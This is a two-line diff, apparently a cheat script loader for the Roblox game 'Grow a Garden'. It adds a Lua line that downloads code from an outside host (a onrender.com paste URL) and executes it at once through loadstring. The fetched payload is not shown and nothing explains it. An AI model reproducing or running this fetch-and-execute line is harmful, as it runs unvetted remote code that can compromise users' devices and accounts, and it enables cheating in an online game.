@@ -1,1 +1,2 @@
 grow a garden script
+loadstring(game:HttpGet('http://traxpastee.onrender.com/raw/gRRald'))()
